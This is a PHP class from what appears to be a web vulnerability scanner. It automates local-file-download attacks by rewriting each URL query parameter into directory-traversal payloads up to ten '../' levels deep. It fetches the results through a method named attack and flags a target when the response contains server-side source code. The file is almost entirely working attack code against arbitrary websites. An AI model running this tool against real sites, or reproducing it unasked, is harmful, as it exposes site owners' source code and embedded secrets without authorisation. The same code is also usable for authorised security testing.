<?php

namespace Aszone\Vulnerabilities;

use GuzzleHttp\ClientInterface;
use Psr\Log\LoggerInterface;
use Aszone\Vulnerabilities\Log\Logger;

class LocalFileDownload implements VulnerabilityScanner
{
    private $client;

    private $logger;

    public function __construct(ClientInterface $client, LoggerInterface $logger = null)
    {
        $this->client = $client;

        if (empty($logger)) {
            $logger = new Logger;
        }
        $this->logger = $logger;


    }

    public function isVulnerable($target)
    {
        if ($this->isLfdPossible($target)) {
            return $this->verify($target);
        }

        return false;
    }

    public function isLfdPossible($target)
    {
        return (bool) preg_match("/\?|(.+?)\=/", $target);
    }

    protected function verify($target)
    {
        $urls = $this->generateUrls($target);

        $this->logger->info("\n");

        foreach ($urls as $url) {
            $result = $this->attack($url);

            if ($result && $this->isApplicationFile($result)) {
                $this->logger->info('Is Vull');

                return $url;
            }
        }

        return false;
    }

    protected function isApplicationFile($body)
    {
        return (bool) preg_match("/<%@|<%|<\?php|<\?=/", $body);
    }

    protected function attack($url)
    {
        $this->logger->info('.');

        try {
            return $this->client->get($url)->getBody()->getContents();
        } catch (\Exception $e) {
            $this->logger->error('#');
        }

        return false;
    }

    public function generateUrls($target)
    {
        $this->logger->info($target);

        $parts = parse_url($target);

        if (!isset($parts['path'])) {
            return [];
        }

        $ext = $this->getExtension($parts['path']);

        $urlsIndex = $this->generateUrlsByExploit($target, 'index.'.$ext);
        $urlsPath = $this->generateUrlsByExploit($target, $parts['path']);

        return array_merge($urlsPath, $urlsIndex);
    }

    public function generateUrlsByExploit($target, $exploit)
    {
        $explodeUrl = parse_url($target);
        $explodeQuery = explode('&', $explodeUrl['query']);

        foreach ($explodeQuery as $keyQuery => $query) {
            $explodeQueryEqual = explode('=', $query);
            $wordsValue[$explodeQueryEqual[0]] = '';

            if ($explodeQueryEqual[1]) {
                $wordsValue[$explodeQueryEqual[0]] = $explodeQueryEqual[1];
            }
        }

        foreach ($wordsValue as $keyValue => $value) {
            $urls[] = str_replace($keyValue.'='.$value, $keyValue.'=??????????', $target);
        }

        $urlFinal = [];

        foreach ($urls as $url) {
            $urlFinal[] = str_replace('??????????', $exploit, $url);

            $breakFolder = '../';

            for ($i = 1; $i <= 10; ++$i) {
                $urlFinal[] = str_replace('??????????', $breakFolder.$exploit, $url);
                $breakFolder .= '../';
            }
        }

        return $urlFinal;
    }

    protected function getExtension($path)
    {
        $isValidExt = preg_match("/\.(.*)/", $path, $matches);

        if ($isValidExt) {
            return $matches[1];
        }

        return false;
    }
}
